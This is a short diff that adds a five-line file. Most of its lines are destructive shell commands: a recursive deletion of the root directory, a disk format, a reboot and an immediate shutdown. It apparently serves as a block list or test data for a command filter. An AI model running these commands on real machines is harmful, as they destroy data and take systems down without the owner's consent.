@@ -1,0 +1,5 @@
+sudo rrm
+rm -rf /
+sudo reboot
+shutdown -h now
+mkfs.ext4 /dev/sda
